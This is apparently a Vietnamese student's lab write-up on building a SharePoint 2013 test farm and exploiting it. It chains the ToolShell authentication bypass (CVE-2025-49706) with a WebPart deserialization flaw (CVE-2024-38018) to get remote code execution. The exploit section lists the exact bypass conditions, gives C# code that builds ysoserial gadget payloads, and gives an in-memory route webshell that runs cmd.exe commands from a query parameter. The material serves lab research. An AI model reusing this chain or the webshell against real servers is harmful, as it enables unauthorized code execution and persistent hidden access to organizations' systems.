---
title: ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized
tags: [dotNet]
slug: sharepoint-2013
date: 2026-01-20 00:00:00+0000
---

Tiếp nối từ series trước, trong lúc mình thực hiện thực nghiệm cho đồ án, mình đã nghĩ đến việc là làm 2 cái lab đơn giản để trigger memshell thôi. Nhưng giảng viên hướng dẫn của mình bảo là "Làm Sharepoint đi em". So yeah, here we are 🗿
## I. Setup Guidelines
Một số link Setup mẫu mình đã tham khảo:
- https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d
- https://hackmd.io/@taidh/ByE7_Kqlh

### Cấu hình máy ảo:
- DC: WinServer 2012 - 2x2 cores - 4GB RAM
- SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM
- Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM

### DC
Set up DNS Server và promote thành Domain Controller. 2 máy sau sẽ join domain và set DNS là IP của máy DC.
<br>![image](https://hackmd.io/_uploads/SJNrQMhole.png)<br>
Tạo OU ServiceAccounts và thêm 3 account:
```
First name: SharePoint
Last name: FarmAdmin
User logon name: sp_farmadmin
Bỏ chọn “User must change password at next logon”
Chọn “Password never expires”
Tương tự cho sp_service và sql_service

sp_service
First name: SharePoint
Last name: Service
Username: sp_service

sql_service
First name: SQL
Last name: Service
Username: sql_service
```
### SQL Server
Join Domain và set DNS.
Tải SQL Server Express bản Advanced để cài luôn cả thể Management Studio. Link tải: https://www.microsoft.com/en-us/download/details.aspx?id=43351<br>
Tại đây chọn SQLEXPRADV_x64_ENU.exe và cài đặt như bình thường.<br>
Lưu ý: Để không bị lỗi `The SQL Server service account login or password is not valid. Use SQL Server Configuration Manager to update the service account.` khi set người dùng DC\sql_service cho SQL Server Database Engine thì sử dụng WinServer 2012 để set up, dùng Win10 sẽ bị lỗi (mình không hiểu vì sao).<br>
Còn lại config theo hướng dẫn của anh Jang và a TàiDH
### Sharepoint Server
Join Domain và set DNS.<br>
Link download file img sharepoint: https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013 => Chọn bản English<br>
WinServer 2012 dính rất nhiều lỗi khi set up SharePoint Server 2013:
#### Lỗi set role IIS
```!
There was an error during Installation, The tool was unable to install Application Server Role, Web Server (IIS) Role
```
Link tham khảo nếu gặp:<br>
https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html<br>
https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/
- Tự cài đặt các feature bằng Powershell:
```bash!
Add-WindowsFeature NET-WCF-HTTP-Activation45,NET-WCF-TCP-Activation45,NET-WCF-Pipe-Activation45
Add-WindowsFeature Net-Framework-Features,Web-Server,Web-WebServer,Web-Common-Http,Web-Static-Content,Web-Default-Doc,Web-Dir-Browsing,Web-Http-Errors,Web-App-Dev,Web-Asp-Net,Web-Net-Ext,Web-ISAPI-Ext,Web-ISAPI-Filter,Web-Health,Web-Http-Logging,Web-Log-Libraries,Web-Request-Monitor,Web-Http-Tracing,Web-Security,Web-Basic-Auth,Web-Windows-Auth,Web-Filtering,Web-Digest-Auth,Web-Performance,Web-Stat-Compression,Web-Dyn-Compression,Web-Mgmt-Tools,Web-Mgmt-Console,Web-Mgmt-Compat,Web-Metabase,Application-Server,AS-Web-Support,AS-TCP-Port-Sharing,AS-WAS-Support, AS-HTTP-Activation,AS-TCP-Activation,AS-Named-Pipes,AS-Net-Framework,WAS,WAS-Process-Model,WAS-NET-Environment,WAS-Config-APIs,Web-Lgcy-Scripting,Windows-Identity-Foundation,Server-Media-Foundation,Xps-Viewer
```
- Copy file `C:\Windows\System32\ServerManager.exe` ngay tại folder System32 và đổi tên thành `ServerManagerCMD.exe`
- Nếu vẫn không được, xem log tại `%TEMP%` => prerequisiteinstaller.{thời gian cài đặt}.log để đọc log sẽ thấy command run update role như sau:
```bash!
"C:\Windows\system32\ServerManagerCmd.exe" -inputpath "C:\Users\SP_FAR~1\AppData\Local\Temp\PreFEB1.tmp.XML"

"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe" -i

"C:\Windows\system32\cscript.exe" "C:\Windows\system32\iisext.vbs" /enext "ASP.NET v4.0.30319"

"C:\Windows\system32\iisreset.exe" /noforce
```
Có thể tự chạy xong rồi restart máy cài tiếp (biện pháp cuối cùng)<br>
Lưu ý: Không tắt ServerManager khi đang install. Nếu như install thấy lâu chứng tỏ đang chết tại bước set Role này, nó đang đợi kết quả trả về
#### Lỗi khi download các package
Khi download các package như SQL Server Native Client và các package sau sẽ liên tục dính lỗi vì WinServer 2012 đã cũ và không thực hiện kết nối được site go.microsoft.com (WinServer 2012 có vấn đề gì đấy với TLS1.2)
```!
2025-09-19 07:07:02 - [In HRESULT format] (0)
2025-09-19 07:07:02 - Beginning download of Microsoft Sync Framework Runtime v1.0 SP1 (x64)
2025-09-19 07:07:02 - http://go.microsoft.com/fwlink/?LinkID=224449
2025-09-19 07:07:02 - Error: InternetOpenUrl failed (0X80072F07=-2147012857)
2025-09-19 07:07:02 - http://go.microsoft.com/fwlink/?LinkID=224449
2025-09-19 07:07:02 - Error: Download failed (0)
2025-09-19 07:07:02 - Last return code (-1)
```
Đến đoạn này thì khi gặp lỗi ở đâu mình sẽ copy link download fail tại file log và tải ở ngoài, sau đó tự cài các package vào.<br>
Đây là các package mình đã tải:
<br>![image](https://hackmd.io/_uploads/HJvyZG3ogl.png)<br>
Các file msi thì có thể chạy ngay, sau đó restart máy cài tiếp.
Còn một số file exe nên chạy command, cài đặt giao diện xong Sharepoint vẫn sẽ báo là download error (không hiểu kiểu gì):
```bash!
WindowsServerAppFabricSetup_x64.exe /i CacheClient,CachingService,CacheAdmin /gac

WcfDataServices.exe /quiet /norestart

AppFabric1.1-KB2671763-x64-ENU.exe /quiet /norestart
```
Sau khi cài đặt sau đều nên restart rồi bật lên cài tiếp, cho đến khi hiện quá trình cài đặt hoàn tất thì tiếp tục chạy setup.exe và làm theo các bước set up Sharepoint:
<br>![image](https://hackmd.io/_uploads/H1bdZzhjxl.png)<br>
Cấu hình Sharepoint theo mặc định. Tại bước Database server nhập ip của máy SQL Server là 10.10.1.137 và người dùng kết nối là sp_service. Sau khi cấu hình xong, truy cập tới đường dẫn http://sp-server:16504/ để xác nhận đã cấu hình Central Admin thành công:
<br>![image](https://hackmd.io/_uploads/rkGND9yB-g.png)<br>
Tiếp tục tạo site test collection:
<br>![image](https://hackmd.io/_uploads/Skme_qJrbx.png)<br>
## II. ToolShell in Sharepoint
Do lần đầu vọc Sharepoint, mình đã đi tìm một CVE có poc sẵn để thực hiện khai thác, sau đó mình chọn bug ToolShell vì nó có ảnh hưởng đến tất cả version của Sharepoint 2013. Bug này trigger chỉ bằng 1 request, gồm 2 bước: Bypass Authen và Deserialize to RCE.<br>
Để tiến hành debug và đọc source của Sharepoint thì mình sử dụng Dnspy, chọn Attach to Process và trỏ đúng tiến trình IIS w3wp.exe đang chạy Collection Site của Sharepoint tại port 80:
<br>![image](https://hackmd.io/_uploads/Hydk_5kBWe.png)<br>
Mở tab Modules để xem các file dll đang được tiến trình load, từ đó có được dll đang được Sharepoint load:
<br>![image](https://hackmd.io/_uploads/rJUruqyHZx.png)<br>
### [CVE-2025-49706] Bypass Authentication
CVE-2025-49706 xảy ra tại class SPRequestModule thuộc namespace Microsoft.SharePoint.ApplicationRuntime. Đây là một class implements IHttpModule, sử dụng để chứa các EventHandler trong request pipeline của IIS. <br>
Tại đây, method PostAuthenticateRequestHandler được sử dụng để xử lý xác thực các HTTP request đến trong Sharepoint, chính vì vậy nó được gọi chỉ sau event BeginRequest:
<br>![image](https://hackmd.io/_uploads/rJ53O51HWe.png)<br>
Bên trong hàm tồn tại đoạn code xử lý truy cập các file css js đối với người dùng không xác thực như sau:
```csharp!
if (!context.User.Identity.IsAuthenticated){
    if (flag4){
       if (this.RequestPathIndex == SPRequestModule.PathIndex._layouts){
          Uri uri3 = null;
          try{
             uri3 = context.Request.UrlReferrer;
          }
          catch (UriFormatException){}
          if (uri3 != null){
             string absolutePath = uri3.AbsolutePath;
             if (SPRequestModule.s_LoginUrl == null){
                ULS.SendTraceTag(2470943U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Unexpected, "LoginUrl is unset for request to '{0}'.", new object[] { SPAlternateUrl.ContextUri });
             }
             else if (absolutePath.EndsWith(SPRequestModule.s_LoginUrl, StringComparison.OrdinalIgnoreCase) && (text2.EndsWith(".css", StringComparison.OrdinalIgnoreCase) || text2.EndsWith(".js", StringComparison.OrdinalIgnoreCase))){
                context.SkipAuthorization = true;
             }
          }
       }
    }
    else if (!flag6 && settingsForContext != null && settingsForContext.UseClaimsAuthentication && !settingsForContext.AllowAnonymous){
       ...
       SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
    }
    else if (flag5){
       ...
       SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
    }
}
```
Logic code sẽ cho phép người dùng unauthen vẫn có thể truy cập các file script js và stylesheet css để phục vụ việc hiển thị. Các trường hợp còn lại sẽ kiểm tra nhằm trả về status 401 về cho người dùng. Có 3 nhánh if else, nếu như làm cho false cả 3 thì người dùng không xác thực có thể bypass đoạn check này và tiếp tục được xử lý yêu cầu. Để làm được điều đó thì cần flag6 là true, còn flag4 và flag5 cần có giá trị false.<br>
Xem xét đoạn code đằng trước, ta thấy được nếu như flag4 mang giá trị false thì chương trình sẽ nhảy vào nhánh if(flag5) vì flag5 = !flag4 = true:
```csharp!
bool flag4 = SPSecurity.AuthenticationMode == AuthenticationMode.Forms && !flag2;
bool flag5 = !flag4;
ULS.SendTraceTag(2373643U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Verbose, "Value for checkAuthenticationCookie is : {0}", new object[] { flag5 });
bool flag6 = false;
string text2 = context.Request.FilePath.ToLowerInvariant();
if (flag5){
    Uri uri2 = null;
    try{
       uri2 = context.Request.UrlReferrer;
    }
    catch (UriFormatException){}
    if (this.IsShareByLinkPage(context) || this.IsAnonymousVtiBinPage(context) || this.IsAnonymousDynamicRequest(context) || context.Request.Path.StartsWith(this.signoutPathRoot) || context.Request.Path.StartsWith(this.signoutPathPrevious) || context.Request.Path.StartsWith(this.signoutPathCurrent) || context.Request.Path.StartsWith(this.startPathRoot) || context.Request.Path.StartsWith(this.startPathPrevious) || context.Request.Path.StartsWith(this.startPathCurrent) || (uri2 != null && (SPUtility.StsCompareStrings(uri2.AbsolutePath, this.signoutPathRoot) || SPUtility.StsCompareStrings(uri2.AbsolutePath, this.signoutPathPrevious) || SPUtility.StsCompareStrings(uri2.AbsolutePath, this.signoutPathCurrent)))){
       flag5 = false;
       flag6 = true;
    }
}
```
Trong nhánh if(flag5), server lấy ra giá trị của header Referer và so sánh giá trị của của nó với giá trị signoutPathRoot, signoutPathPrevious và signoutPathCurrent. Chỉ cần một trong các điều kiện trên đúng thì chương trình sẽ set giá trị flag5 là false và flag6 là true, đúng với ý định ban đầu. Các giá trị signoutPath mang giá trị như sau:
<br>![image](https://hackmd.io/_uploads/B1F-K9yrbx.png)<br>
Hàm GetLayoutsFolder trả về giá trị `_layouts/15` hoặc `_layouts`:
<br>![image](https://hackmd.io/_uploads/rkcfYcyrZe.png)<br>
Mặc định thì flag4 sẽ có giá trị false, nên để bypass cơ chế xác thực này, giá trị của header Referer sẽ là `/_layouts/SignOut.aspx` hoặc `/_layouts/15/SignOut.aspx`:
<br>![image](https://hackmd.io/_uploads/BJ_VK5yH-e.png)<br>
PoC req gọi không xác thực:
<br>![image](https://hackmd.io/_uploads/HJCBY5yBbe.png)<br>
Req bypass auth:
<br>![image](https://hackmd.io/_uploads/Skq8t9kBZg.png)<br>
Tiếp tục đi đến nơi trigger lỗ hổng trong PoC là file ToolPane.aspx, bản thân file không có gì đặc biệt mà chỉ có đoạn khai báo code control nằm tại class Microsoft.SharePoint.WebPartPages.ToolPane:
```csharp!
<%@ Register TagPrefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPages"%>
<WebPartPages:ToolPane runat="server"/>
```
Tại đây, Method OnInit được gọi đầu tiên để khởi tạo page, đồng thời gọi đến CheckForCustomToolpane để kiểm tra đường dẫn có phải để tạo ToolPane không:
<br>![image](https://hackmd.io/_uploads/BkQNqc1rZl.png)<br>
Hàm CheckForCustomToolpane kiểm tra đường dẫn URL xem có chứa `/_layouts/` và kết thúc bằng `/ToolPane.aspx` hay không, nếu có sẽ trả về true:
<br>![image](https://hackmd.io/_uploads/BywB9qkSWg.png)<br>
Tiếp theo, chương trình sẽ xử lý đến hàm SelectedAspWebPart, nơi mà nội dung WebPart truyền trong body sẽ được xử lý thông qua 2 giá trị tại body là MSOTlPn_Uri và MSOTlPn_DWP:
<br>![image](https://hackmd.io/_uploads/SyHLq51Hbx.png)<br>
MSOTlPn_Uri chứa đường dẫn frontPage, còn MSOTlPn_DWP chứa nội dung thông tin về Web Part để tiến hành import, logic import sẽ nằm tại hàm GetPartPreviewAndPropertiesFromMarkup. Để vào được câu lệnh if thì còn điều kiện DisplayMode = EditDisplayMode, hay `?DisplayMode=Edit`.<br>
Nhảy vào GetPartPreviewAndPropertiesFromMarkup - hàm xử lý trực tiếp import webpart là GetMarkupProperties, cũng là sink vuln deserialize bằng webpart. Nhưng trước khi đến được hàm đó cần phải thỏa mãn tất cả những dòng lệnh trên, trong đó có CreateAndInitializeDocumentDesigner, với input pageUri chính là param MSOTlPn_Uri đã truyền vào trước đó:
<br>![image](https://hackmd.io/_uploads/B111j5yrWe.png)<br>
CreateAndInitializeDocumentDesigner sẽ gọi đến method Create của class ServerWebFileFromFileSystem với callstack:
<br>![image](https://hackmd.io/_uploads/B1HeoqkS-g.png)<br>
Tại method này, chương trình tiến hành kiểm tra url truyền vào có chứa `_controltemplates/` và có phải file .ascx không, nếu tồn tại thì trả về object ServerWebFile dựa trên file thật, không sẽ trả về null:
<br>![image](https://hackmd.io/_uploads/rJUWoc1B-l.png)<br>
Nhằm thỏa mãn dòng lệnh trên, cần tìm file ascx tùy ý nằm trong folder `_controltemplates/`, mình lựa chọn `_controltemplates/15/ActionBar.ascx` để poc vì nó ở ngay đầu.<br>
Cũng có hơi nhiều điều kiện rồi, tổng hợp lại để bypass authen vào được endpoint ToolPane.aspx, mình cần:
-	Referer header: `/_layouts/15/SignOut.aspx`
-	URL param: `DisplayMode=Edit`
-	URL phải kết thúc bằng /ToolPane.aspx: thêm một url param tùy ý với giá trị là /ToolPane.aspx 
-	MSOTlPn_Uri: `http://sp-server/my/_controltemplates/15/ActionBar.ascx`
### [CVE-2024-38018] WebPart Properties Insecure Deserialize
Khúc này sẽ hơi cấn vì tại sao mình lại không dùng CVE-2025-49704 mà lại là một CVE khác. Khi tiến hành thử poc để test thì mình confirm đã bypass auth nhưng lại không thể trigger deser, nó sẽ văng ra lỗi file Web Part not valid, mình đoán là do cấu trúc Webpart của phiên bản 2013 và 2019 có sự khác biệt nên khi import vào bị lỗi. (Vậy mà microsoft bảo rằng exploit được ở mọi phiên bản Sharepoint 2013)<br>
Mày mò cài Service Pack và cài tiếp bản patch cho Sharepoint nhưng cũng không giòn. Mình có đi hỏi và biết được người anh em xã hội cũng gặp vấn đề tương tự, và  người anh em đó đã cho mình một solution khác: sử dụng CVE-2024-38018 - một CVE khác attack vào Insecure Deserialize property của webpart. PoC của lỗ hổng đã được đề cập và phân tích khá chi tiết tại https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ nên mình cũng khá là ăn theo thôi :)))<br>
Tiếp tục phân tích nào, mình sẽ lấy phần webpart của bài phân tích trên:
```xml!
<%@ Register Tagprefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPages" Assembly="Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<WebPartPages:XmlWebPart ID="SPWebPartManager" runat="Server">
    <WebPart xmlns="http://schemas.microsoft.com/WebPart/v2">
<AttachedPropertiesShared>{SerializeData}</AttachedPropertiesShared>
    </WebPart>
</WebPartPages:XmlWebPart>
```
CVE-2024-38018 đã khai thác lỗ hổng Insecure Deserialize dữ liệu DataSet thông qua cơ chế parse webpart control để thực thi code từ xa, bắt đầu từ method `WebPart.AddParsedSubObject()`. Method này sẽ luôn được gọi khi truyền vào một webpart control, với mục đích lấy toàn bộ chuỗi truyền vào đã loại bỏ phần register và reference assembly thông qua class LiteralControl để đưa vào method ParseXml:
<br>![image](https://hackmd.io/_uploads/B1hFR5JrZe.png)<br>
ParseXml thực hiện deserialize dữ liệu truyền vào thông qua XmlSerializer. Deserialize, trả về object webPart và tiếp tục gọi đến DoPostDeserializationTasks để thực hiện một số thao tác sau lần deserialize đầu tiên:
<br>![image](https://hackmd.io/_uploads/H1pq0ckBbg.png)<br>
DoPostDeserializationTasks sẽ tiếp tục call đến GetAttachedProperties, tại đây thuộc tính `_serializedAttachedPropertiesShared` được deserialize với binder SPSerializationBinder:
<br>![image](https://hackmd.io/_uploads/B1aj0cyBZl.png)<br>
Trong khi đó, `_serializedAttachedPropertiesShared` có thể được set giá trị bằng element tag AttachedPropertiesShared:
<br>![image](https://hackmd.io/_uploads/ByQT09yrZg.png)<br>
Binder SPSerializationBinder cho phép thực hiện deserialize với bất kì class nào thuộc SafeControls -  là một thuộc tính được khai báo trong web.config của Sharepoint site, chứa danh sách các assembly, namespace và class được phép gọi đến và sử dụng trong Sharepoint:
<br>![image](https://hackmd.io/_uploads/S1bCRc1rZx.png)<br>
Trong đống class này, vô tình làm sao có chứa SPThemes kế thừa class DataSet, cũng như sử dụng constructor của Dataset:
<br>![image](https://hackmd.io/_uploads/H1UlJo1Sbx.png)<br>
Có DataSet là ngon luôn, mình đớp ngay gadget chain dataset được sử dụng trong ysoserial, chain này sẽ call đến method deserialize DataSet.Tables_0 bằng BinaryFormatter mà không kiểm tra binder. Ở đây sửa đoạn code DataSetGenerator thành type SPThemes là oke:
```csharp!
[Serializable]
public class DataSetMarshalMod : ISerializable
{
    private byte[] _fakeTable;

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.SetType(typeof(SPThemes));
        info.AddValue("DataSet.RemotingFormat", SerializationFormat.Binary);
        info.AddValue("DataSet.DataSetName", "");
        info.AddValue("DataSet.Namespace", "");
        info.AddValue("DataSet.Prefix", "");
        info.AddValue("DataSet.CaseSensitive", false);
        info.AddValue("DataSet.LocaleLCID", 1033);
        info.AddValue("DataSet.EnforceConstraints", false);
        info.AddValue("DataSet.ExtendedProperties", null);
        info.AddValue("DataSet.Tables.Count", 1);
        info.AddValue("DataSet.Tables_0", this._fakeTable);
    }

    public void SetFakeTable(byte[] bfPayload) => this._fakeTable = bfPayload;

    public DataSetMarshalMod(byte[] bfPayload) => this.SetFakeTable(bfPayload);
}
```
Đoạn code xử lý thì dùng reflection để call được SPObjectStateFormatter.Serialize(), lưu ý là cần sử dụng dll của Sharepoint:
```csharp!
static void Main(string[] args){
    var spformatter = Activator.CreateInstance("Microsoft.SharePoint").Unwrap();
    MethodInfo SPSerializer = spformatter.GetType().GetMethod("Serialize", new Type[] { typeof(object) });
    var psi = new ProcessStartInfo(@"ysoserial.exe", @"-g TypeConfuseDelegate -f BinaryFormatter -o base64 -c ""echo SUCCESS > C:\Users\Public\pwn.txt"""){
       RedirectStandardOutput = true,
       UseShellExecute = false,
       CreateNoWindow = true
    };
    var p = Process.Start(psi);
    string payload = p.StandardOutput.ReadToEnd().Trim();
    p.WaitForExit();
    byte[] bytes = Convert.FromBase64String(payload);
    DataSetMarshalMod marshal = new DataSetMarshalMod(bytes);
    ArrayList myAl = new ArrayList();
    myAl.Add(marshal);
    object[] parametersArray = new object[] { myAl };
    string result = (string)SPSerializer.Invoke(spformatter, parametersArray);
    Console.WriteLine(result);
}
```
Tổng hợp lại, request khai thác cuối cùng sẽ như này:
<br>![image](https://hackmd.io/_uploads/r1kvMokSWe.png)<br>
Mặc dù trả về 401 nhưng chức năng này đã được thực thi (Sharepoint có nhiều đoạn return 401 quá và mình cũng lười trace). Mở máy chạy sharepoint lên là ta thấy ngay file pwn.txt:
<br>![image](https://hackmd.io/_uploads/ryaKMj1S-l.png)<br>
## III. Deploy Memory Webshell
Mình chọn route memory webshell để inject vì nó có thể inject vào cả WebMVC và WebForms, cũng như khá dễ code. Để hiểu rõ hơn về Route Memory Webshell hoạt động như thế nào thì có thể ngó qua [Memshell in dotnet](https://kev1n1203.github.io/p/memshell-dotnet) của mình.<br>
Tại đây mình dùng gadgetchain ActivitySurrogateSelector để load code C#, gadgetchain này trong tool yso mặc định sẽ lấy binary từ file E.cs để load nhưng mình test thì thấy khá nhấp nháy nên mình đã chọn compile file này thành dll rồi load (works everytime).<br>
Vì chain này nếu như với ver dotNet > 4.7 thì cần phải disable type check, nên mình đi check ver dotnet của Sharepoint:
```bash!
PS C:\Users\sp_farmadmin> Set-Location 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client'
PS HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client> Get-ItemProperty -Path . | Select-Object Version

Version
-------
4.5.51641
```
Ngon luôn, thử test deser load C# code trước nào.<br>
File E.cs mình sửa tí từ file mặc định thôi:
```csharp!
class E {
    public E(){
        HttpContext.Current.Response.AddHeader("kev1n-header-custom", "muhehehehe");
        HttpContext.Current.Response.Cookies.Add(new HttpCookie("skibidi", "dopdopyesyes"));
        HttpContext.Current.Response.End();
    }
}
```
Sửa lại script exploit phần call như sau:
```csharp!
static void Main(string[] args)
{
    var spformatter = Activator.CreateInstance("Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c", "Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter").Unwrap();
    MethodInfo SPSerializer = spformatter.GetType().GetMethod("Serialize", new Type[] { typeof(object) });
    Process.Start(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe", @"/target:library /out:ysoserial-net\E.dll ysoserial-net\E.cs")?.WaitForExit();

    var psi = new ProcessStartInfo(@"ysoserial.exe", @"-f BinaryFormatter -g ActivitySurrogateSelector -c ""1337""")
    {
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
    };
    var p = Process.Start(psi);
    string payload = p.StandardOutput.ReadToEnd().Trim();
    p.WaitForExit();
    //Console.WriteLine(payload);
    byte[] bytes = Convert.FromBase64String(payload);
    DataSetMarshalMod marshal = new DataSetMarshalMod(bytes);

    ArrayList myAl = new ArrayList();
    myAl.Add(marshal);
    object[] parametersArray = new object[] { myAl };
    string result = (string)SPSerializer.Invoke(spformatter, parametersArray);
    File.WriteAllText("objstate.txt", result);
    Console.WriteLine(result);
}
```
Gen thành payload và send request, response có chứa cookie và header mình set:
<br>![image](https://hackmd.io/_uploads/SyS7Lj1B-e.png)<br>
Sửa code file E.cs thành code deploy memshell:
```csharp!
class E {
    public class MyRouteBase : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            String cmd = httpContext.Request.QueryString["command"]; 
            if (cmd != null)
            {
                HttpResponseBase response = httpContext.Response;
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c" + cmd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }

    public E(){
        RouteCollection routeCollection = RouteTable.Routes;
        routeCollection.Insert(0, new MyRouteBase());
        HttpContext.Current.Response.AddHeader("Custom-Header", "Route Memshell Injected!!!!!!!!");
        HttpContext.Current.Response.End();
    }
}
```
Xuất hiện header Custom-Header trong response, chứng tỏ C# code đã được load:
<br>![image](https://hackmd.io/_uploads/HJytUs1HZl.png)<br>
RCE thôi:
<br>![image](https://hackmd.io/_uploads/HynF8oyBZl.png)<br>
